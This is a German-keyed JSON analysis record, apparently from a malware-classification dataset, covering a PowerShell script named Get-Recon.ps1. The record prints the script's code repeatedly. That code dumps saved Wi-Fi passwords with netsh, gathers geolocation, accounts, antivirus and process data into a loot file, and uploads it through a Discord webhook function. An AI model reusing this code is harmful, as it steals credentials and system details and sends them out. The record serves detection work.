@@ -1,0 +1,174 @@
+{
+  "meta": {
+    "quelldatei": "tech_013_Get-Recon.ps1",
+    "sha256": "558c16e52b018c826a59e15bd2ae405212412a303557d5d632117951b29a5d9c",
+    "groesse_bytes": 5002,
+    "zeilen": 124,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "http://ip-api.com/json",
+      "$env:TEMP\\CaliLoot.txt",
+      " : ",
+      ")[1]).Trim()\n}\n$WLANProfileObjects =@()\n\nForeach($WLANProfileName in $WLANProfileNames){\n\n    try{\n        $WLANProfilePassword = (((netsh.exe wlan show profiles name=",
+      " key=clear | select-string -Pattern ",
+      ") -split ",
+      ")[1]).Trim()\n    }Catch{\n        $WLANProfilePassword = ",
+      "\n    }\n\n    $WLANProfileObject = New-Object PSCustomobject \n    $WLANProfileObject | Add-Member -Type NoteProperty -Name ",
+      " -Value $WLANProfileName\n    $WLANProfileObject | Add-Member -Type NoteProperty -Name ",
+      " -Value $WLANProfilePassword\n    $WLANProfileObjects += $WLANProfileObject\n    Remove-Variable WLANProfileObject    \n}\nreturn $WLANProfileObjects\n}\n\n    try {\n        $response = Invoke-RestMethod -Uri $ipInfoApiUrl -Method Get\n        if ($response.status -eq 'success') {\n            $geoData = @{\n                'IP'          = $response.query\n                'Country'     = $response.country\n                'Region'      = $response.regionName\n                'City'        = $response.city\n                'Latitude'    = $response.lat\n                'Longitude'   = $response.lon\n                'TimeZone'    = $response.timezone\n                'ISP'         = $response.isp\n            }\n            $geoData | Out-File -FilePath $outputFile\n\n            $networkConfig = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }\n            if ($networkConfig) {\n                $networkData = @{\n                    'PrivateIP'     = $networkConfig.IPAddress[0]\n                    'Subnet'        = $networkConfig.IPSubnet[0]\n                    'DefaultGateway' = $networkConfig.DefaultIPGateway[0]\n                    'DNS'           = $networkConfig.DNSServerSearchOrder -join ', '\n                }\n                $networkData | Out-File -FilePath $outputFile -Append\n            }\n            else {\n                ",
+      " | Out-File -FilePath $outputFile -Append\n            }\n\n            ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-WmiObject Win32_UserAccount | ForEach-Object {\n                ",
+      " | Out-File -FilePath $outputFile -Append\n            }\n\n            $firewallStatus = Get-NetFirewallProfile | Select-Object -ExpandProperty Enabled\n            ",
+      " | Out-File -FilePath $outputFile -Append\n\n            $antivirus = Get-CimInstance -Namespace ",
+      " -ClassName ",
+      "\n            if ($antivirus) {\n                $antivirusData = @{\n                    'Name'     = $antivirus.DisplayName\n                    'State'    = $antivirus.ProductState\n                }\n                $antivirusData | Out-File -FilePath $outputFile -Append\n            }\n            else {\n                ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-Networks | ForEach-Object {\n                ",
+      " | Out-File -FilePath $outputFile -Append\n            }\n\t\t\t\n            ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-ComputerInfo | Out-File -FilePath $outputFile -Append\n\n            ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-Process | Out-File -FilePath $outputFile -Append\n\n     \t    ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-AppxPackage | Out-File -FilePath $outputFile -Append\n        }\n        else {\n            ",
+      " | Out-File -FilePath $outputFile -Append\n        }\n    }\n    catch {\n        ",
+      " | Out-File -FilePath $outputFile -Append\n    }\n}\n\nfunction Upload-Discord {\n    param (\n        [string]$file,\n        [string]$text,\n        [string]$webhookUrl\n    )\n\n    if ($text) {\n        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body @{ 'username' = $env:username; 'content' = $text }\n    }\n    elseif ($file) {\n        (New-Object Net.WebClient).UploadFile($webhookUrl, $file)\n    }\n}\n\n#Get-Recon\n\n#Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK HERE' -file "
+    ],
+    "string_anzahl_gesamt": 24,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "http://ip-api.com/json",
+      "$env:TEMP\\CaliLoot.txt",
+      " : ",
+      ")[1]).Trim()\n}\n$WLANProfileObjects =@()\n\nForeach($WLANProfileName in $WLANProfileNames){\n\n    try{\n        $WLANProfilePassword = (((netsh.exe wlan show profiles name=",
+      " key=clear | select-string -Pattern ",
+      ") -split ",
+      ")[1]).Trim()\n    }Catch{\n        $WLANProfilePassword = ",
+      "\n    }\n\n    $WLANProfileObject = New-Object PSCustomobject \n    $WLANProfileObject | Add-Member -Type NoteProperty -Name ",
+      " -Value $WLANProfileName\n    $WLANProfileObject | Add-Member -Type NoteProperty -Name ",
+      " -Value $WLANProfilePassword\n    $WLANProfileObjects += $WLANProfileObject\n    Remove-Variable WLANProfileObject    \n}\nreturn $WLANProfileObjects\n}\n\n    try {\n        $response = Invoke-RestMethod -Uri $ipInfoApiUrl -Method Get\n        if ($response.status -eq 'success') {\n            $geoData = @{\n                'IP'          = $response.query\n                'Country'     = $response.country\n                'Region'      = $response.regionName\n                'City'        = $response.city\n                'Latitude'    = $response.lat\n                'Longitude'   = $response.lon\n                'TimeZone'    = $response.timezone\n                'ISP'         = $response.isp\n            }\n            $geoData | Out-File -FilePath $outputFile\n\n            $networkConfig = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }\n            if ($networkConfig) {\n                $networkData = @{\n                    'PrivateIP'     = $networkConfig.IPAddress[0]\n                    'Subnet'        = $networkConfig.IPSubnet[0]\n                    'DefaultGateway' = $networkConfig.DefaultIPGateway[0]\n                    'DNS'           = $networkConfig.DNSServerSearchOrder -join ', '\n                }\n                $networkData | Out-File -FilePath $outputFile -Append\n            }\n            else {\n                ",
+      " | Out-File -FilePath $outputFile -Append\n            }\n\n            ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-WmiObject Win32_UserAccount | ForEach-Object {\n                ",
+      " | Out-File -FilePath $outputFile -Append\n            }\n\n            $firewallStatus = Get-NetFirewallProfile | Select-Object -ExpandProperty Enabled\n            ",
+      " | Out-File -FilePath $outputFile -Append\n\n            $antivirus = Get-CimInstance -Namespace ",
+      " -ClassName ",
+      "\n            if ($antivirus) {\n                $antivirusData = @{\n                    'Name'     = $antivirus.DisplayName\n                    'State'    = $antivirus.ProductState\n                }\n                $antivirusData | Out-File -FilePath $outputFile -Append\n            }\n            else {\n                ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-Networks | ForEach-Object {\n                ",
+      " | Out-File -FilePath $outputFile -Append\n            }\n\t\t\t\n            ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-ComputerInfo | Out-File -FilePath $outputFile -Append\n\n            ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-Process | Out-File -FilePath $outputFile -Append\n\n     \t    ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-AppxPackage | Out-File -FilePath $outputFile -Append\n        }\n        else {\n            ",
+      " | Out-File -FilePath $outputFile -Append\n        }\n    }\n    catch {\n        ",
+      " | Out-File -FilePath $outputFile -Append\n    }\n}\n\nfunction Upload-Discord {\n    param (\n        [string]$file,\n        [string]$text,\n        [string]$webhookUrl\n    )\n\n    if ($text) {\n        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body @{ 'username' = $env:username; 'content' = $text }\n    }\n    elseif ($file) {\n        (New-Object Net.WebClient).UploadFile($webhookUrl, $file)\n    }\n}\n\n#Get-Recon\n\n#Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK HERE' -file "
+    ],
+    "string_anzahl_gesamt": 24,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Add-Member",
+      "Format-Table",
+      "Get-AppxPackage",
+      "Get-CimInstance",
+      "Get-ComputerInfo",
+      "Get-NetFirewallProfile",
+      "Get-Networks",
+      "Get-Process",
+      "Get-Recon",
+      "Get-WmiObject",
+      "Invoke-RestMethod",
+      "New-Object",
+      "Out-File",
+      "Out-Null",
+      "Remove-Variable",
+      "Select-Object",
+      "Select-String",
+      "Upload-Discord",
+      "Where-Object"
+    ],
+    "auffaellige_tokens": {
+      "webclient": 1
+    },
+    "iocs": {
+      "urls": [
+        "http://ip-api.com/json"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:TEMP\\CaliLoot.txt",
+        "$env:username"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "http://ip-api.com/json",
+      "$env:TEMP\\CaliLoot.txt",
+      " : ",
+      ")[1]).Trim()\n}\n$WLANProfileObjects =@()\n\nForeach($WLANProfileName in $WLANProfileNames){\n\n    try{\n        $WLANProfilePassword = (((netsh.exe wlan show profiles name=",
+      " key=clear | select-string -Pattern ",
+      ") -split ",
+      ")[1]).Trim()\n    }Catch{\n        $WLANProfilePassword = ",
+      "\n    }\n\n    $WLANProfileObject = New-Object PSCustomobject \n    $WLANProfileObject | Add-Member -Type NoteProperty -Name ",
+      " -Value $WLANProfileName\n    $WLANProfileObject | Add-Member -Type NoteProperty -Name ",
+      " -Value $WLANProfilePassword\n    $WLANProfileObjects += $WLANProfileObject\n    Remove-Variable WLANProfileObject    \n}\nreturn $WLANProfileObjects\n}\n\n    try {\n        $response = Invoke-RestMethod -Uri $ipInfoApiUrl -Method Get\n        if ($response.status -eq 'success') {\n            $geoData = @{\n                'IP'          = $response.query\n                'Country'     = $response.country\n                'Region'      = $response.regionName\n                'City'        = $response.city\n                'Latitude'    = $response.lat\n                'Longitude'   = $response.lon\n                'TimeZone'    = $response.timezone\n                'ISP'         = $response.isp\n            }\n            $geoData | Out-File -FilePath $outputFile\n\n            $networkConfig = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }\n            if ($networkConfig) {\n                $networkData = @{\n                    'PrivateIP'     = $networkConfig.IPAddress[0]\n                    'Subnet'        = $networkConfig.IPSubnet[0]\n                    'DefaultGateway' = $networkConfig.DefaultIPGateway[0]\n                    'DNS'           = $networkConfig.DNSServerSearchOrder -join ', '\n                }\n                $networkData | Out-File -FilePath $outputFile -Append\n            }\n            else {\n                ",
+      " | Out-File -FilePath $outputFile -Append\n            }\n\n            ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-WmiObject Win32_UserAccount | ForEach-Object {\n                ",
+      " | Out-File -FilePath $outputFile -Append\n            }\n\n            $firewallStatus = Get-NetFirewallProfile | Select-Object -ExpandProperty Enabled\n            ",
+      " | Out-File -FilePath $outputFile -Append\n\n            $antivirus = Get-CimInstance -Namespace ",
+      " -ClassName ",
+      "\n            if ($antivirus) {\n                $antivirusData = @{\n                    'Name'     = $antivirus.DisplayName\n                    'State'    = $antivirus.ProductState\n                }\n                $antivirusData | Out-File -FilePath $outputFile -Append\n            }\n            else {\n                ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-Networks | ForEach-Object {\n                ",
+      " | Out-File -FilePath $outputFile -Append\n            }\n\t\t\t\n            ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-ComputerInfo | Out-File -FilePath $outputFile -Append\n\n            ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-Process | Out-File -FilePath $outputFile -Append\n\n     \t    ",
+      " | Out-File -FilePath $outputFile -Append\n            Get-AppxPackage | Out-File -FilePath $outputFile -Append\n        }\n        else {\n            ",
+      " | Out-File -FilePath $outputFile -Append\n        }\n    }\n    catch {\n        ",
+      " | Out-File -FilePath $outputFile -Append\n    }\n}\n\nfunction Upload-Discord {\n    param (\n        [string]$file,\n        [string]$text,\n        [string]$webhookUrl\n    )\n\n    if ($text) {\n        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body @{ 'username' = $env:username; 'content' = $text }\n    }\n    elseif ($file) {\n        (New-Object Net.WebClient).UploadFile($webhookUrl, $file)\n    }\n}\n\n#Get-Recon\n\n#Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK HERE' -file "
+    ],
+    "string_anzahl_gesamt": 24,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Add-Member",
+      "Format-Table",
+      "Get-AppxPackage",
+      "Get-CimInstance",
+      "Get-ComputerInfo",
+      "Get-NetFirewallProfile",
+      "Get-Networks",
+      "Get-Process",
+      "Get-Recon",
+      "Get-WmiObject",
+      "Invoke-RestMethod",
+      "New-Object",
+      "Out-File",
+      "Out-Null",
+      "Remove-Variable",
+      "Select-Object",
+      "Select-String",
+      "Upload-Discord",
+      "Where-Object"
+    ],
+    "auffaellige_tokens": {
+      "webclient": 1
+    },
+    "iocs": {
+      "urls": [
+        "http://ip-api.com/json"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:TEMP\\CaliLoot.txt",
+        "$env:username"
+      ]
+    },
+    "deobfuskiert_auszug": "function Get-Recon {\n    $ipInfoApiUrl = \"http://ip-api.com/json\"\n    $outputFile = \"$env:TEMP\\CaliLoot.txt\"\n\t\n\tFunction Get-Networks {\n$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress \n\n$WLANProfileNames =@()\n\n$Output = netsh.exe wlan show profiles | Select-String -pattern \" : \"\n\nForeach($WLANProfileName in $Output){\n    $WLANProfileNames += (($WLANProfileName -split \":\")[1]).Trim()\n}\n$WLANProfileObjects =@()\n\nForeach($WLANProfileName in $WLANProfileNames){\n\n    try{\n        $WLANProfilePassword = (((netsh.exe wlan show profiles name=\"$WLANProfileName\" key=clear | select-string -Pattern \"Key Content\") -split \":\")[1]).Trim()\n    }Catch{\n        $WLANProfilePassword = \"The password is not stored in this profile\"\n    }\n\n    $WLANProfileObject = New-Object PSCustomobject \n    $WLANProfileObject | Add-Member -Type NoteProperty -Name \"ProfileName\" -Value $WLANProfileName\n    $WLANProfileObject | Add-Member -Type NoteProperty -Name \"ProfilePassword\" -Value $WLANProfilePassword\n    $WLANProfileObjects += $WLANProfileObject\n    Remove-Variable WLANProfileObject    \n}\nreturn $WLANProfileObjects\n}\n\n    try {\n        $response = Invoke-RestMethod -Uri $ipInfoApiUrl -Method Get\n        if ($response.status -eq 'success') {\n            $geoData = @{\n                'IP'          = $response.query\n                'Country'     = $response.country\n                'Region'      = $response.regionName\n                'City'        = $response.city\n                'Latitude'    = $response.lat\n                'Longitude'   = $response.lon\n                'TimeZone'    = $response.timezone\n                'ISP'         = $response.isp\n            }\n            $geoData | Out-File -FilePath $outputFile\n\n            $networkConfig = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "WebClient erstellen"
+    ]
+  }
+}
